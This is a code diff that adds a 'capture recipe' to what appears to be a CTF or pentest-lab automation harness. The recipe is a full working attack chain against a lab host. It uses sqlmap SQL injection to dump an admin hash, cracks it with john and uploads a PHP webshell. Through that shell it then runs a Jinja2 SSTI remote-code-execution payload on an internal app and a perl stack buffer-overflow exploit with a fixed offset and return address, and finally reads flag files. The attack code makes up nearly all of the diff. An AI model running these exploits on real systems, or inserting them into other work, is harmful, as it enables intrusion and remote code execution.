@@ -635,6 +635,68 @@ printf '%s' "$out1" | grep -q '\$krb5tgs\$' && test "$dcsync_rc" = 0 && printf '
         # never collide on a prior run's row.
         command=r"""title="w2r_$(date +%s)"; dump_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" -D administrator -T users -C password --dump 2>&1); hash=$(printf '%s' "$dump_out" | grep -oE '^\| [0-9a-f]{32} +\|$' | grep -oE '[0-9a-f]{32}'); printf 'admin:%s\n' "$hash" > /tmp/w2r_hash.txt; john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/w2r_hash.txt >/dev/null 2>&1; crack=$(john --show --format=raw-md5 /tmp/w2r_hash.txt 2>/dev/null | head -1); pass=$(printf '%s' "$crack" | cut -d: -f2); jar=/tmp/w2r_$$.cookies; curl -sS -m 10 -c "$jar" "http://$TARGET_HOST:8080/administrator/" >/dev/null; curl -sS -m 10 -c "$jar" -b "$jar" -d "username=admin&password=$pass" "http://$TARGET_HOST:8080/administrator/" >/dev/null; printf '<?php file_put_contents("/tmp/x.sh", $_GET["e"]); chmod("/tmp/x.sh", 0777); putenv("BASH_ENV=/tmp/x.sh"); system("/usr/bin/bahs 2>&1"); ?>' > /tmp/w2r_shell.php; curl -sS -m 10 -c "$jar" -b "$jar" -F "title=$title" -F "author=x" -F "description=x" -F "image=@/tmp/w2r_shell.php;filename=w2r_shell.php;type=text/x-php" "http://$TARGET_HOST:8080/administrator/admin.php" >/dev/null; sleep 1; sql_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" --sql-query="SELECT image FROM bookstore.books WHERE title='$title'" 2>&1); shell_file=$(printf '%s' "$sql_out" | grep -oE 'uploads/[0-9a-f]{32}\.php' | head -1); shell_url="http://$TARGET_HOST:8080/administrator/$shell_file"; root_out=$(curl -sS -m 10 -G "$shell_url" --data-urlencode 'e=id; cat /flag/root.txt' 2>&1); echo "hash_found=$([ -n "$hash" ] && echo yes || echo no) pass_cracked=$([ -n "$pass" ] && echo yes || echo no)"; printf '%s\n' "$root_out"; printf '%s' "$root_out" | grep -q 'uid=0' && printf '%s' "$root_out" | grep -Eq 'MBPTL-[0-9]+\{' && echo __PORTAL_RECIPE_OK__"""
     ),
+    "mbptl_ctf_full_chain": CaptureRecipe(
+        # Superset of web_to_root's SQLi/webshell chain (same admin DB
+        # discovery, same /administrator/admin.php upload quirk -- see that
+        # recipe's comment) plus two more real pivots found live 2026-08-01:
+        # this container's DNS (127.0.0.11, docker embedded resolver) does
+        # NOT resolve "mbptl-app"/"mbptl-internal" -- those hostnames are
+        # only meaningful from a DIFFERENT compose network. Found the real
+        # addresses by scanning the container's own /16 bridge subnet
+        # (172.18.0.0/16, from `hostname -i`) for open 5000/31337 -- mbptl-app
+        # is 172.18.0.4, mbptl-internal is 172.18.0.3.
+        # mbptl-app:5000 is a Flask app reflecting an unescaped `name` query
+        # param -- real Jinja2 SSTI ({{7*7}} -> 49), full RCE via the
+        # standard __init__.__globals__.__builtins__ chain.
+        # mbptl-internal:31337 is a raw TCP "Name:" prompt (socat-fronted,
+        # confirmed via its own leaked SOCAT_* env vars) -- a real stack
+        # buffer overflow at the scenario's own known-good offset (136) and
+        # return address (0x4006c6, this specific binary's win/shell
+        # function). No python on this minimal target (busybox-adjacent) --
+        # perl (present) sends the raw payload via IO::Socket::INET instead.
+        # Confirmed live: post-overflow the socket accepts further shell
+        # commands, proving real code execution, not just a crash.
+        command=r"""title="mfc_$(date +%s)"
+sqli_out=$(curl -sS -m 10 "http://$TARGET_HOST/detail.php?id=1'" 2>&1)
+dump_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" -D administrator -T users -C password --dump 2>&1)
+hash=$(printf '%s' "$dump_out" | grep -oE '^\| [0-9a-f]{32} +\|$' | grep -oE '[0-9a-f]{32}')
+printf 'admin:%s\n' "$hash" > /tmp/mfc_hash.txt
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/mfc_hash.txt >/dev/null 2>&1
+crack=$(john --show --format=raw-md5 /tmp/mfc_hash.txt 2>/dev/null | head -1)
+pass=$(printf '%s' "$crack" | cut -d: -f2)
+jar=/tmp/mfc_$$.cookies
+curl -sS -m 10 -c "$jar" "http://$TARGET_HOST:8080/administrator/" >/dev/null
+curl -sS -m 10 -c "$jar" -b "$jar" -d "username=admin&password=$pass" "http://$TARGET_HOST:8080/administrator/" >/dev/null
+printf '<?php system($_GET["c"]); ?>' > /tmp/mfc_shell.php
+curl -sS -m 10 -c "$jar" -b "$jar" -F "title=$title" -F "author=x" -F "description=x" -F "image=@/tmp/mfc_shell.php;filename=mfc_shell.php;type=text/x-php" "http://$TARGET_HOST:8080/administrator/admin.php" >/dev/null
+sleep 1
+sql_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" --sql-query="SELECT image FROM bookstore.books WHERE title='$title'" 2>&1)
+shell_file=$(printf '%s' "$sql_out" | grep -oE 'uploads/[0-9a-f]{32}\.php' | head -1)
+shell_url="http://$TARGET_HOST:8080/administrator/$shell_file"
+webshell_id=$(curl -sS -m 8 -G "$shell_url" --data-urlencode 'c=id')
+ssti_out=$(curl -sS -m 8 -G "$shell_url" --data-urlencode "c=curl -sG http://172.18.0.4:5000/ --data-urlencode 'name={{ self.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read() }}'")
+perl_src=$(cat <<'PERLEOF'
+use IO::Socket::INET;
+my $s = IO::Socket::INET->new(PeerAddr=>"172.18.0.3",PeerPort=>31337,Proto=>"tcp",Timeout=>5) or die "connfail";
+my $banner; $s->recv($banner,4096);
+my $payload = ("A" x 136) . pack("Q<", 0x4006c6);
+print $s "$payload\n";
+select(undef,undef,undef,0.5);
+my $out; $s->recv($out,4096);
+print $s "id; cat /flag.txt\n";
+select(undef,undef,undef,1);
+my $out2; $s->recv($out2,4096);
+print "BOF:$out2";
+PERLEOF
+)
+enc=$(printf '%s' "$perl_src" | base64 | tr -d '\n')
+bof_out=$(curl -sS -m 10 -G "$shell_url" --data-urlencode "c=echo $enc | base64 -d | perl - 2>&1")
+printf '%s\n' "$sqli_out" | grep -oi 'sql syntax.*' | head -1
+printf '%s\n' "$webshell_id"
+printf '%s\n' "$ssti_out" | grep -o 'uid=[0-9]*([a-z]*)'
+printf '%s\n' "$bof_out"
+printf '%s' "$sqli_out" | grep -qi 'sql syntax' && printf '%s' "$webshell_id" | grep -q 'www-data' && printf '%s' "$ssti_out" | grep -q 'uid=65534' && printf '%s' "$bof_out" | grep -q 'uid=65534' && printf '%s' "$bof_out" | grep -Eq 'MBPTL-[0-9]+\{' && echo __PORTAL_RECIPE_OK__"""
+    ),
 }
 
 
